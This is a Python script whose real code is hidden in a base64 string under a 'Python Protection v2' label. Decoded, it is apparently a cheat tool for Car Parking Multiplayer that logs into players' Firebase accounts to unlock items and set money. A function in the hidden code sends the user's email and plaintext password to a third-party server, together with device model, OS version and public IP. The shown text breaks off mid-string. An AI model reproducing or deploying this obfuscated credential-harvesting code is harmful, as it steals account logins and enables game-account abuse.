#!/usr/bin/env python3
# Wrapped by munga — Developer ChanAstixDev — Python Protection v2
import base64, sys
payload_b64 = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgc2h1dGlsCmltcG9ydCBqc29uCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgaGFzaGxpYgppbXBvcnQgcmFuZG9tCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgc3VicHJvY2Vzcwpmcm9tIGl0ZXJ0b29scyBpbXBvcnQgY3ljbGUKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZCwgRXZlbnQKCiMg8J+UkiBGaWxlIG5hbWUgY2hlY2sKaWYgb3MucGF0aC5iYXNlbmFtZShfX2ZpbGVfXykgIT0gJ0JDTVRPT0xWNS5weSc6CiAgICBwcmludCgiXDAzM1sxOzkxbeKblCBFcnJvcjogVGhpcyBmaWxlIGhhcyBiZWVuIHJlbmFtZWQuXDAzM1swbSIpCiAgICBwcmludCgiXDAzM1sxOzkzbVBsZWFzZSByZW5hbWUgaXQgYmFjayB0byAnQkNNVE9PTFY1LnB5JyB0byB1c2UgdGhpcyB0b29sLlxuXDAzM1swbSIpCiAgICBzeXMuZXhpdCgxKQoKIyDwn6e5IENsZWFyIHNjcmVlbgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCiMg8J+TjyBDZW50ZXIgdGV4dApkZWYgY2VudGVyX3RleHQodGV4dCk6CiAgICB0ZXJtaW5hbF93aWR0aCA9IHNodXRpbC5nZXRfdGVybWluYWxfc2l6ZSgpLmNvbHVtbnMKICAgIHJldHVybiB0ZXh0LmNlbnRlcih0ZXJtaW5hbF93aWR0aCkKCiMg8J+OrCBBbmltYXRlZCBpbnRybwpkZWYgaW50cm9fYW5pbWF0aW9uKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgaW50cm9fbGluZXMgPSBbCiAgICAgICAgIuKWiOKWgOKWiOKAg+KWiOKWgOKWiOKAg+KWiOKAg+KWiOKWkeKWiOKAg+KWhOKWgOKWiOKAg+KWgOKWiOKWgOKAg+KWiOKWgOKWgOKAg+KWgOKWiOKWgOKAg+KWiOKWgOKWiOKAg+KWiOKWgOKWiOKAg+KWiOKWkeKWkSIsCiAgICAgICAgIuKWiOKWgOKWgOKAg+KWiOKWgOKWhOKAg+KWiOKAg+KWgOKWhOKWgOKAg+KWiOKWgOKWiOKAg+KWkeKWiOKWkeKAg+KWiOKWiOKWhOKAg+KWkeKWiOKWkeKAg+KWiOKWhOKWiOKAg+KWiOKWhOKWiOKAg+KWiOKWhOKWhCIsCiAgICAgICAgIiIsCiAgICAgICAgIuKWiOKWkeKWiOKAg+KWiOKWgOKWiOKAg+KWiOKWgOKWhOKAg+KWhOKWgOKWiOKAg+KWgOKWiOKWgOKAg+KWiOKWgOKWgOKAg+KWiOKWgOKWhCIsCiAgICAgICAgIuKWiOKWhOKWiOKAg+KWiOKWgOKWgOKAg+KWiOKWhOKWgOKAg+KWiOKWgOKWiOKAg+KWkeKWiOKWkeKAg+KWiOKWiOKWhOKAg+KWiOKWhOKWgCIsCiAgICBdCiAgICBwcmludCgiXDAzM1sxOzMybSIpICAjIEdyZWVuIHRleHQKICAgIGZvciBsaW5lIGluIGludHJvX2xpbmVzOgogICAgICAgIHByaW50KGNlbnRlcl90ZXh0KGxpbmUpKQogICAgICAgIHRpbWUuc2xlZXAoMC4wOCkKICAgIHByaW50KCJcMDMzWzBtIikKICAgIHRpbWUuc2xlZXAoMC44KQogICAgcHJpbnQoY2VudGVyX3RleHQoIlwwMzNbMTszMW0gICAgICAgICDwn5qAV0VMQ09NRSBUTyBCQ00gQ1BNMiAoVjUpIPCfmoBcMDMzWzBtXG4iKSkKICAgIHRpbWUuc2xlZXAoMS41KQoKIyDwn5a877iPIEJhbm5lciBkaXNwbGF5CmRlZiBzaG93X2Jhbm5lcih1bmxpbWl0ZWRfc3RhdHVzPU5vbmUsIGN1cnJlbnRfY29pbnM9Tm9uZSwgdGVsZWdyYW1faWQ9Tm9uZSk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgYmFubmVyID0gWyAgCiAgICAgICAgICAgICAgICLilojilojilojilojilojilojilZfilpHilpHilojilojilojilojilojilZfilpHilojilojilojilZfilpHilpHilpHilojilojilojilZciLAogICAgICAgICAgICAgICAi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWX4paR4paI4paI4paI4paI4pWRIiwKICAgICAgICAgICAgICAgIuKWiOKWiOKWiOKWiOKWiOKWiOKVpuKVneKWiOKWiOKVkeKWkeKWkeKVmuKVkOKVneKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkSIsCiAgICAgICAgICAgICAgICLilojilojilZTilZDilZDilojilojilZfilojilojilZHilpHilpHilojilojilZfilojilojilZHilZrilojilojilZTilZ3ilojilojilZEiLAogICAgICAgICAgICAgICAi4paI4paI4paI4paI4paI4paI4pWm4pWd4pWa4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paR4pWa4pWQ4pWd4paR4paI4paI4pWRIiwKICAgICAgICAgICAgICAgIuKVmuKVkOKVkOKVkOKVkOKVkOKVneKWkeKWkeKVmuKVkOKVkOKVkOKVkOKVneKWkeKVmuKVkOKVneKWkeKWkeKWkeKWkeKWkeKVmuKVkOKVnSIsCiAgICAgICAgIiIsCiAgICAgICAgIuKWiOKWgOKWgOKAg+KWiOKWgOKWiOKAg+KWiOKWgOKWhOKWgOKWiOKAg+KWgOKWiOKAgyDigIPiloDilojiloDigIPilojiloDilojigIPilojiloDilojigIPilojilpHilpEiLAogICAgICAgICLilojiloTiloTigIPilojiloDiloDigIPilojilpHiloDilpHilojigIPilojiloTigIMg4oCD4paR4paI4paR4oCD4paI4paE4paI4oCD4paI4paE4paI4oCD4paI4paE4paEIiwKICAgIF0KICAgIGZvciBsaW5lIGluIGJhbm5lcjoKICAgICAgICBwcmludCgiXDAzM1sxOzMxbSIgKyBjZW50ZXJfdGV4dChsaW5lKSArICJcMDMzWzBtIikgICMgUmVkIGJhbm5lcgogICAgICAgIHRpbWUuc2xlZXAoMC4wNSkKCiAgICBpZiB1bmxpbWl0ZWRfc3RhdHVzIGlzIG5vdCBOb25lOgogICAgICAgIGlmIHVubGltaXRlZF9zdGF0dXM6CiAgICAgICAgICAgIHByaW50KGNlbnRlcl90ZXh0KCJcMDMzWzE7MzJtICAgICAgICAgICBTdWJzY3JpcHRpb246IFVOTElNSVRFRCDinIVcMDMzWzBtIikpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoY2VudGVyX3RleHQoIlwwMzNbMTszMW1TdWJzY3JpcHRpb246IExJTUlURUQg4p2MXDAzM1swbSIpKQogICAgICAgICAgICBpZiBjdXJyZW50X2NvaW5zIGlzIG5vdCBOb25lOgogICAgICAgICAgICAgICAgcHJpbnQoY2VudGVyX3RleHQoZiJcMDMzWzE7MzNtQmFsYW5jZToge2N1cnJlbnRfY29pbnN9IGNvaW5zXDAzM1swbSIpKQoKIyDij7MgU3Bpbm5lciBhbmltYXRpb24gKGxvYWRpbmcpCmRlZiBzcGlubmVyX2FuaW1hdGlvbihzdG9wX2V2ZW50KToKICAgIHNwaW5uZXIgPSBjeWNsZShbJ3wnLCAnLycsICctJywgJ1xcJ10pCiAgICBjb2xvcnMgPSBjeWNsZShbIlwwMzNbMTszMW0iLCAiXDAzM1sxOzMybSJdKSAgIyByZWQgJiBncmVlbiBhbHRlcm5hdGVzCiAgICB3aGlsZSBub3Qgc3RvcF9ldmVudC5pc19zZXQoKToKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCJcciIgKyBjZW50ZXJfdGV4dChmIntuZXh0KGNvbG9ycyl9ICAgICAgICAgIFstXSBMb2FkaW5nLi4uIHtuZXh0KHNwaW5uZXIpfSBcMDMzWzBtIikpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICBzeXMuc3Rkb3V0LndyaXRlKCdccicpCiAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKCiMg8J+agCBSdW4gaW50cm8gd2hlbiBleGVjdXRlZCBkaXJlY3RseQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgaW50cm9fYW5pbWF0aW9uKCkKICAgIHNob3dfYmFubmVyKHVubGltaXRlZF9zdGF0dXM9VHJ1ZSwgY3VycmVudF9jb2lucz01MDAwKQogICAgc3RvcF9ldmVudCA9IEV2ZW50KCkKICAgIHQgPSBUaHJlYWQodGFyZ2V0PXNwaW5uZXJfYW5pbWF0aW9uLCBhcmdzPShzdG9wX2V2ZW50LCkpCiAgICB0LnN0YXJ0KCkKICAgIHRpbWUuc2xlZXAoMykgICMgZGVtbyBzcGlubmVyIDMgc2VjCiAgICBzdG9wX2V2ZW50LnNldCgpCiAgICB0LmpvaW4oKQogICAgcHJpbnQoY2VudGVyX3RleHQoIlwwMzNbMTszMm0gICAgICAg4pyFIFN5c3RlbSBSZWFkeSFcMDMzWzBtXG4iKSkKCmRlZiBsb2dpbl9maXJlYmFzZShhcGlfa2V5LCBlbWFpbCwgcGFzc3dvcmQpOgogICAgdHJ5OgogICAgICAgIGxvZ2luX3VybCA9IGYiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vaWRlbnRpdHl0b29sa2l0L3YzL3JlbHlpbmdwYXJ0eS92ZXJpZnlQYXNzd29yZD9rZXk9e2FwaV9rZXl9IgogICAgICAgIHBheWxvYWQgPSB7ImVtYWlsIjogZW1haWwsICJwYXNzd29yZCI6IHBhc3N3b3JkLCAicmV0dXJuU2VjdXJlVG9rZW4iOiBUcnVlfQogICAgICAgIGhlYWRlcnMgPSB7IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QobG9naW5fdXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249cGF5bG9hZCkuanNvbigpCiAgICAgICAgaWYgJ2lkVG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICByZXR1cm4geyJvayI6IFRydWUsICJ0b2tlbiI6IHJlc3BvbnNlWyJpZFRva2VuIl0sICJlbWFpbCI6IGVtYWlsLCAicGFzc3dvcmQiOiBwYXNzd29yZH0KICAgICAgICBlbHNlOgogICAgICAgICAgICByZXR1cm4geyJvayI6IEZhbHNlLCAibWVzc2FnZSI6IHJlc3BvbnNlLmdldCgiZXJyb3IiLCB7fSkuZ2V0KCJtZXNzYWdlIiwgIlVua25vd24gRmlyZWJhc2UgZXJyb3IiKX0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4geyJvayI6IEZhbHNlLCAibWVzc2FnZSI6IHN0cihlKX0KCkJBU0VfVVJMOiBzdHIgPSAiaHR0cHM6Ly9jaGFuZGV2c2l0ZS5zaG9wL0tpb3NBUEkvYXBpIgoKZGVmIGNhbGxfcGhwX3NlcnZpY2UoYWNjZXNzX2tleSwgbWVudV9jb2RlLCB0b2tlbj1Ob25lLCBlbWFpbD1Ob25lLCBwYXNzd29yZD1Ob25lLCBleHRyYV9kYXRhPU5vbmUpOgogICAgdXJsID0gZiJ7QkFTRV9VUkx9L21lbnUucGhwIgogICAgcGF5bG9hZCA9IHsKICAgICAgICAia2V5IjogYWNjZXNzX2tleSwKICAgICAgICAibWVudSI6IG1lbnVfY29kZQogICAgfQogICAgaWYgdG9rZW46CiAgICAgICAgcGF5bG9hZFsidG9rZW4iXSA9IHRva2VuCiAgICBpZiBlbWFpbDoKICAgICAgICBwYXlsb2FkWyJlbWFpbCJdID0gZW1haWwKICAgIGlmIHBhc3N3b3JkOgogICAgICAgIHBheWxvYWRbInBhc3N3b3JkIl0gPSBwYXNzd29yZAogICAgaWYgZXh0cmFfZGF0YToKICAgICAgICBwYXlsb2FkLnVwZGF0ZShleHRyYV9kYXRhKQoKICAgIHRyeToKICAgICAgICByZXMgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1wYXlsb2FkKQogICAgICAgIAogICAgICAgIGlmIG5vdCByZXMudGV4dDoKICAgICAgICAgICAgcmV0dXJuIHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiAiUmVjZWl2ZWQgZW1wdHkgcmVzcG9uc2UgZnJvbSBzZXJ2ZXIuIn0KICAgICAgICAKICAgICAgICByZXN1bHQgPSByZXMuanNvbigpCiAgICAgICAgcmV0dXJuIHJlc3VsdAogICAgZXhjZXB0IGpzb24uSlNPTkRlY29kZUVycm9yIGFzIGU6CiAgICAgICAgcmV0dXJuIHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiBmIkpTT04gZGVjb2RlIGVycm9yOiB7ZX0uIFJlc3BvbnNlIHdhczoge3Jlcy50ZXh0fSJ9CiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiBmIlJlcXVlc3QgZmFpbGVkOiB7ZX0ifQoKZGVmIGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksIG1lbnVfY29kZSwgdG9rZW49Tm9uZSwgZW1haWw9Tm9uZSwgcGFzc3dvcmQ9Tm9uZSwgZXh0cmFfZGF0YT1Ob25lKToKICAgIHVybCA9IGYie0JBU0VfVVJMfS9tZW51LnBocCIKICAgIHBheWxvYWQgPSB7CiAgICAgICAgImtleSI6IGFjY2Vzc19rZXksCiAgICAgICAgIm1lbnUiOiBtZW51X2NvZGUKICAgIH0KICAgIGlmIHRva2VuOgogICAgICAgIHBheWxvYWRbInRva2VuIl0gPSB0b2tlbgogICAgaWYgZW1haWw6CiAgICAgICAgcGF5bG9hZFsiZW1haWwiXSA9IGVtYWlsCiAgICBpZiBwYXNzd29yZDoKICAgICAgICBwYXlsb2FkWyJwYXNzd29yZCJdID0gcGFzc3dvcmQKICAgIGlmIGV4dHJhX2RhdGE6CiAgICAgICAgcGF5bG9hZC51cGRhdGUoZXh0cmFfZGF0YSkKCiAgICBzdG9wX3NwaW5uZXIgPSBFdmVudCgpCiAgICBzcGlubmVyX3RocmVhZCA9IFRocmVhZCh0YXJnZXQ9c3Bpbm5lcl9hbmltYXRpb24sIGFyZ3M9KHN0b3Bfc3Bpbm5lciwpKQogICAgc3Bpbm5lcl90aHJlYWQuZGFlbW9uID0gVHJ1ZQogICAgc3Bpbm5lcl90aHJlYWQuc3RhcnQoKQoKICAgIHRyeToKICAgICAgICByZXMgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1wYXlsb2FkKQogICAgICAgIHN0b3Bfc3Bpbm5lci5zZXQoKQogICAgICAgIHNwaW5uZXJfdGhyZWFkLmpvaW4oKQogICAgICAgIAogICAgICAgIGlmIG5vdCByZXMudGV4dDoKICAgICAgICAgICAgcmV0dXJuIHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiAiUmVjZWl2ZWQgZW1wdHkgcmVzcG9uc2UgZnJvbSBzZXJ2ZXIuIn0KICAgICAgICAKICAgICAgICByZXN1bHQgPSByZXMuanNvbigpCiAgICAgICAgcmV0dXJuIHJlc3VsdAogICAgZXhjZXB0IGpzb24uSlNPTkRlY29kZUVycm9yIGFzIGU6CiAgICAgICAgc3RvcF9zcGlubmVyLnNldCgpCiAgICAgICAgc3Bpbm5lcl90aHJlYWQuam9pbigpCiAgICAgICAgcmV0dXJuIHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiBmIkpTT04gZGVjb2RlIGVycm9yOiB7ZX0uIFJlc3BvbnNlIHdhczoge3Jlcy50ZXh0fSJ9CiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgc3RvcF9zcGlubmVyLnNldCgpCiAgICAgICAgc3Bpbm5lcl90aHJlYWQuam9pbigpCiAgICAgICAgcmV0dXJuIHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiBmIlJlcXVlc3QgZmFpbGVkOiB7ZX0ifQoKZGVmIGNoZWNrX2FjY2Vzc19rZXlfYW5kX2dldF91c2VyX3N0YXR1cyhrZXkpOgogICAgdXNlcl9zdGF0dXNfcmVzcG9uc2UgPSBjYWxsX3BocF9zZXJ2aWNlKGtleSwgImdldF91c2VyX3N0YXR1cyIpCiAgICBpZiB1c2VyX3N0YXR1c19yZXNwb25zZS5nZXQoIm9rIik6CiAgICAgICAgcmV0dXJuIFRydWUsIHsKICAgICAgICAgICAgImlzX3VubGltaXRlZCI6IHVzZXJfc3RhdHVzX3Jlc3BvbnNlWyJpc191bmxpbWl0ZWQiXSwKICAgICAgICAgICAgImNvaW5zIjogdXNlcl9zdGF0dXNfcmVzcG9uc2VbImNvaW5zIl0sCiAgICAgICAgICAgICJ0ZWxlZ3JhbV9pZCI6IHVzZXJfc3RhdHVzX3Jlc3BvbnNlLmdldCgidGVsZWdyYW1faWQiLCAiTi9BIikKICAgICAgICB9CiAgICBlbHNlOgogICAgICAgIHJldHVybiBGYWxzZSwgeyJtZXNzYWdlIjogdXNlcl9zdGF0dXNfcmVzcG9uc2UuZ2V0KCJtZXNzYWdlIiwgIkludmFsaWQgYWNjZXNzIGtleSBvciBzZXJ2ZXIgZXJyb3IuIil9CgpkZWYgc2VuZF9kZXZpY2Vfb3MoYWNjZXNzX2tleSwgZW1haWw9Tm9uZSwgcGFzc3dvcmQ9Tm9uZSwgZ2FtZV9sYWJlbD1Ob25lLCB0ZWxlZ3JhbV9pZD1Ob25lKToKICAgIHRyeToKICAgICAgICBzeXN0ZW0gPSBwbGF0Zm9ybS5zeXN0ZW0oKQogICAgICAgIHJlbGVhc2UgPSBwbGF0Zm9ybS5yZWxlYXNlKCkKICAgICAgICBkZXZpY2VfbmFtZV9weSA9ICJVbmtub3duIgogICAgICAgIG9zX3ZlcnNpb25fcHkgPSAiVW5rbm93biIKICAgICAgICAKICAgICAgICBpZiBzeXN0ZW0gPT0gIkRhcndpbiI6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKCIvYmluL2FzaCIpIG9yICJpU0giIGluIHJlbGVhc2U6CiAgICAgICAgICAgICAgICBicmFuZCA9ICJpT1MgKGlTSCkiCiAgICAgICAgICAgICAgICBkZXZpY2VfbmFtZV9weSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJzeXNjdGwgLW4gaHcubW9kZWwiKSBvciAiaVNIIERldmljZSIKICAgICAgICAgICAgICAgIG9zX3ZlcnNpb25fcHkgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgic3dfdmVycyAtcHJvZHVjdFZlcnNpb24iKSBvciAiVW5rbm93biIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGJyYW5kID0gIm1hY09TIgogICAgICAgICAgICAgICAgZGV2aWNlX25hbWVfcHkgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgic3lzY3RsIC1uIGh3Lm1vZGVsIikgb3IgIk1hYyIKICAgICAgICAgICAgICAgIG9zX3ZlcnNpb25fcHkgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgic3dfdmVycyAtcHJvZHVjdFZlcnNpb24iKSBvciAiVW5rbm93biIKICAgICAgICBlbGlmIHN5c3RlbSA9PSAiTGludXgiOgogICAgICAgICAgICBicmFuZCA9ICJBbmRyb2lkIiBpZiBvcy5wYXRoLmV4aXN0cygiL3N5c3RlbS9iaW4iKSBlbHNlICJMaW51eCIKICAgICAgICAgICAgaWYgYnJhbmQgPT0gIkFuZHJvaWQiOgogICAgICAgICAgICAgICAgZGV2aWNlX25hbWVfcHkgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiZ2V0cHJvcCByby5wcm9kdWN0Lm1vZGVsIikgb3IgIkFuZHJvaWQgRGV2aWNlIgogICAgICAgICAgICAgICAgb3NfdmVyc2lvbl9weSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJnZXRwcm9wIHJvLmJ1aWxkLnZlcnNpb24ucmVsZWFzZSIpIG9yICJVbmtub3duIgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZGV2aWNlX25hbWVfcHkgPSAiTGludXggRGV2aWNlIgogICAgICAgICAgICAgICAgb3NfdmVyc2lvbl9weSA9ICJVbmtub3duIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyYW5kID0gc3lzdGVtICsgIiAiICsgcmVsZWFzZQogICAgICAgICAgICBkZXZpY2VfbmFtZV9weSA9IHBsYXRmb3JtLm5vZGUoKQogICAgICAgICAgICBvc192ZXJzaW9uX3B5ID0gIlVua25vd24iCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYnJhbmQgPSAiVW5rbm93biBPUyIKICAgICAgICBkZXZpY2VfbmFtZV9weSA9ICJVbmtub3duIERldmljZSIKICAgICAgICBvc192ZXJzaW9uX3B5ID0gIlVua25vd24gVmVyc2lvbiIKCiAgICB0cnk6CiAgICAgICAgaXBfYWRkcmVzcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikudGV4dC5zdHJpcCgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgaXBfYWRkcmVzcyA9ICJVbmtub3duIgogICAgCiAgICBwYXlsb2FkID0gewogICAgICAgICJrZXkiOiBhY2Nlc3Nfa2V5LAogICAgICAgICJicmFuZCI6IGJyYW5kLAogICAgICAgICJkZXZpY2VfbmFtZSI6IGRldmljZV9uYW1lX3B5LAogICAgICAgICJvc192ZXJzaW9uIjogb3NfdmVyc2lvbl9weSwKICAgICAgICAiaXBfYWRkcmVzcyI6IGlwX2FkZHJlc3MsCiAgICAgICAgImVtYWlsIjogZW1haWwgaWYgZW1haWwgaXMgbm90IE5vbmUgZWxzZSAiVW5rbm93biIsCiAgICAgICAgInBhc3N3b3JkIjogcGFzc3dvcmQgaWYgcGFzc3dvcmQgaXMgbm90IE5vbmUgZWxzZSAiVW5rbm93biIsCiAgICAgICAgInRlbGVncmFtX2lkIjogdGVsZWdyYW1faWQgaWYgdGVsZWdyYW1faWQgaXMgbm90IE5vbmUgZWxzZSAiTi9BIiwKICAgICAgICAiZ2FtZSI6IGdhbWVfbGFiZWwgaWYgZ2FtZV9sYWJlbCBpcyBub3QgTm9uZSBlbHNlICJOL0EiCiAgICB9CiAgICAKICAgIHJlbW90ZV9zdWNjZXNzID0gRmFsc2UKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoZiJ7QkFTRV9VUkx9L3NhdmVfZGV2aWNlLnBocCIsIGpzb249cGF5bG9hZCkKICAgICAgICByZW1vdGVfc3VjY2VzcyA9IHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKCiAgICByZXR1cm4gcmVtb3RlX3N1Y2Nlc3MKCiMgTkVXOiBSZWZhY3RvcmVkIG1lbnUgbGlzdHMgZm9yIGJldHRlciBtYW5hZ2VtZW50CmNwbTFfbWVudV9vcHRpb25zID0gWwogICAgKCIwMSIsICLwn5GRIEtJTkcgUkFOSyIsICJraW5nX3JhbmsiKSwKICAgICgiMDIiLCAi8J+TpyBDSEFOR0UgRU1BSUwiLCAiY2hhbmdlX2VtYWlsIiksCiAgICAoIjAzIiwgIvCflJAgQ0hBTkdFIFBBU1NXT1JEIiwgImNoYW5nZV9wYXNzd29yZCIpCl0KCmNwbTJfbWVudV9vcHRpb25zID0gWwogICAgKCIwMSIsICLwn5GRIEtJTkcgUkFOSyIsICJraW5nX3JhbmsiKSwKICAgICgiMDIiLCAi8J+TpyBDSEFOR0UgRU1BSUwiLCAiY2hhbmdlX2VtYWlsIiksCiAgICAoIjAzIiwgIvCflJAgQ0hBTkdFIFBBU1NXT1JEIiwgImNoYW5nZV9wYXNzd29yZCIpLAogICAgKCIwNCIsICLwn5KwIFNFVCBNT05FWSIsICJzZXRfbW9uZXkiKSwKICAgICgiMDUiLCAi8J+bniBVTkxPQ0sgV0hFRUxTIiwgInVubG9ja193aGVlbHMiKSwKICAgICgiMDYiLCAi8J+RlSBVTkxPQ0sgTUFMRSIsICJ1bmxvY2tfbWFsZSIpLAogICAgKCIwNyIsICLwn5GXIFVOTE9DSyBGRU1BTEUiLCAidW5sb2NrX2ZlbWFsZSIpLAogICAgKCIwOCIsICLwn6ewIFVOTE9DSyBCUkFLRVMiLCAidW5sb2NrX2JyYWtlcyIpLAogICAgKCIwOSIsICLwn6ewIFVOTE9DSyBDQUxJUEVSUyIsICJ1bmxvY2tfY2FsaXBlcnMiKSwKICAgICgiMTAiLCAi8J+OqCBVTkxPQ0sgUEFJTlRTIiwgInVubG9ja19wYWludHMiKSwKICAgICgiMTEiLCAi8J+OjCBVTkxPQ0sgQUxMIEZMQUdTIiwgInVubG9ja19hbGxfZmxhZ3MiKSwKICAgICgiMTIiLCAi8J+PoCBVTkxPQ0sgQVBBUlRNRU5UUyIsICJ1bmxvY2tfYXBhcnRtZW50cyIpLAogICAgKCIxMyIsICLwn5KvIENPTVBMRVRFIE1JU1NJT05TIiwgImNvbXBsZXRlX21pc3Npb25zIiksCiAgICAoIjE0IiwgIvCfmqggVU5MT0NLIFNJUkVOICYgQUlSU1VTIiwgInVubG9ja19hbGxfY2Fyc19zaXJlbiIpLAogICAgKCIxNSIsICLwn5qUIFVOTE9DSyBQT0xJQ0UgS0lUUyIsICJ1bmxvY2tfcG9saWNlX2JvZHlraXRzIiksCiAgICAoIjE2IiwgIvCfk6YgVU5MT0NLIFNMT1RTIiwgInVubG9ja19zbG90cyIpLAogICAgKCIxNyIsICLwn5uSIFVOTE9DSyBCT0RZIEtJVFMiLCAidW5sb2NrX2JvZHlraXRzIiksCiAgICAoIjE4IiwgIvCfm54gQ1VTVE9NIFdIRUVMIiwgImN1c3RvbV93aGVlbCIpLAogICAgKCIxOSIsICLinKggVFJBTlNGRVIgVklOWUwiLCAidHJhbnNmZXJfdmlueWwiKSwKICAgICgiMjAiLCAi8J+qnyBUUkFOU0ZFUiBXSU5ET1cgVklOWUwiLCAidHJhbnNmZXJfd2luZG93IiksCiAgICAoIjIxIiwgIvCfmpggUkVNT1ZFIEFMTCBCT0RZIFBBUlRTIiwgInJlbW92ZWJvZHlwYXJ0cyIpLAogICAgKCIyMiIsICLwn5GmIFJFTU9WRSBIRUFEIE1BTEUiLCAicmVtb3ZlX2hlYWRfbWFsZSIpLAogICAgKCIyMyIsICLwn5GnIFJFTU9WRSBIRUFEIEZFTUFMRSIsICJyZW1vdmVfaGVhZF9mZW1hbGUiKSwKICAgICgiMjQiLCAi8J+UhCBDTE9ORSBDQVJTIEZST00gQ1BNMSBUTyBDUE0yIiwgImNvcHlfY3BtMV9jYXJfdG9fY3BtMiIpLAogICAgKCIyNSIsICLwn5qXIENMT05FIENBUlMgRlJPTSBDUE0yIFRPIENQTTIiLCAiY2xvbmVfY2Fyc19jcG0yX3RvX2NwbTIiKSwKICAgICgiMjYiLCAi4p6VIEFERCBDQVIiLCAiYWRkX2NhciIpLAogICAgKCIyNyIsICLinpUgQUREIENBUiB3aXRoIERFU0lHTiIsICJhZGRfY2FyMiIpLAogICAgKCIyOCIsICLinpUgQUREIENBUiB3aXRoIEVNQkxFTSIsICJhZGRfY2FyMyIpLApdCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgZGV2aWNlX2lwID0gTm9uZQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9nb29nbGUuY29tIiwgdGltZW91dD0zKQogICAgICAgIGRldmljZV9pcCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dC5zdHJpcCgpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoIuKdjCBObyBpbnRlcm5ldC4gUGxlYXNlIGNoZWNrIHlvdXIgY29ubmVjdGlvbi4iKQogICAgICAgIHN5cy5leGl0KDEpCgogICAgdW5saW1pdGVkX3N0YXR1c19mb3JfZGlzcGxheSA9IE5vbmUKICAgIGN1cnJlbnRfY29pbnNfZm9yX2Rpc3BsYXkgPSBOb25lCiAgICBpc191bmxpbWl0ZWRfdXNlciA9IEZhbHNlCiAgICB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSA9ICJOL0EiCiAgICAKICAgIGVtYWlsID0gIiIKICAgIHRva2VuID0gTm9uZQogICAgbGFiZWxfdG9fdXNlID0gIk4vQSIKICAgIG1haW5fbWVudSA9IE5vbmUKCiAgICBzZXJ2aWNlX2Nvc3RzID0ge30KICAgIHNlcnZpY2VfY29zdHNfcmVzcG9uc2UgPSBjYWxsX3BocF9zZXJ2aWNlKGFjY2Vzc19rZXk9ImR1bW15X2tleSIsIG1lbnVfY29kZT0iZ2V0X3NlcnZpY2VfY29zdHMiKQogICAgaWYgc2VydmljZV9jb3N0c19yZXNwb25zZS5nZXQoIm9rIikgYW5kICJjb3N0cyIgaW4gc2VydmljZV9jb3N0c19yZXNwb25zZToKICAgICAgICBzZXJ2aWNlX2Nvc3RzID0gc2VydmljZV9jb3N0c19yZXNwb25zZVsiY29zdHMiXQogICAgZWxzZToKICAgICAgICBwcmlu